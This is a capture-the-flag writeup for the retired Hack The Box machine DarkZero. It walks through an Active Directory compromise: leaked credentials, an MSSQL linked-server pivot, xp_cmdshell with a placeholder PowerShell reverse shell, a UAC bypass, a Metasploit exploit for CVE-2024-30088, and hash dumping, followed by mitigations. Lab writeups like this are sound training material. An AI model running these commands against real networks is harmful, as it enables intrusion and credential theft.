---
machine: DarkZero
os: Windows
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [windows, ad, mssql, linked-server, authzbase, trust]
---

# DarkZero — Hack The Box (Windows)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

An SMB share leaks `john.w` credentials with MSSQL access. The server has a linked server to `DC02.darkzero.ext` and the remote login is `sysadmin`; enable `xp_cmdshell` and run code. CVE-2024-30088 escalates to SYSTEM, and with the full token and the forest trust, reach DC01 and dump the domain.

## Recon

```bash
nmap -Pn -sCV -p53,88,135,139,389,445,464,636,1433,3268,3269,5985 <IP>
```

- `53/88/389/445/636` identify a `darkzero.htb` DC.
- `1433/tcp` MSSQL and `5985/tcp` WinRM are exposed.
- The domain has a forest trust with `darkzero.ext` and a second DC `DC02`.

## Enumeration

- An SMB share contains `john.w` credentials, validated against MSSQL.
- `enum_links` shows `DC02.darkzero.ext` and the `john.w` → `dc01_sql_svc` mapping.
- The remote login is `sysadmin`; `xp_cmdshell` is disabled but can be enabled.

## Foothold

Connect with `mssqlclient.py`, use the linked server and enable `xp_cmdshell` to obtain a reverse shell as `svc_sql`.

```bash
mssqlclient.py darkzero.htb/john.w:'<PASSWORD>'@<IP> -windows-auth
enum_links
use_link [DC02.darkzero.ext]
enable_xp_cmdshell
xp_cmdshell powershell -e <BASE64_REVSHELL>
```

## Lateral movement

`svc_sql`'s token lacks full privileges. Get a full token with `RunasCs --logon-type 5 --bypass-uac`, which enables `SeImpersonatePrivilege`. From DC02, enumerate users and the trust with `nltest`; the next hop is DC01.

## Privilege escalation

Exploit CVE-2024-30088 (AuthZBase) to steal `winlogon`'s token and run as SYSTEM. In that context, dump hashes and use the trust to reach DC01, where the same exploit or the recovered credentials lead to Administrator.

```bash
msfconsole -q -x 'use exploit/windows/local/cve_2024_30088_authz_basep; set SESSION 1; run'
hashdump
```

## Evidence

- `john.w` credentials and linked server to DC02.
- Shell as `svc_sql` and full token with `SeImpersonate`.
- SYSTEM on DC02 and Administrator on DC01.

## Lessons learned

- A linked server with a `sysadmin` mapping breaks the domain boundary.
- Incomplete service tokens are expanded with an interactive logon.
- Forest trusts turn a compromised host into a domain-wide problem.

## Mitigation and detection

- Review linked servers and remove unnecessary `sysadmin` mappings.
- Disable `xp_cmdshell` and audit its activation.
- Patch CVE-2024-30088 and limit the forest trust.

## References

- [0xdf — DarkZero](https://0xdf.gitlab.io/2026/04/04/htb-darkzero.html)
- [IppSec — DarkZero](https://www.youtube.com/watch?v=fXPWoLwG3mU)
- [Hack The Box — DarkZero](https://app.hackthebox.com/machines/darkzero)
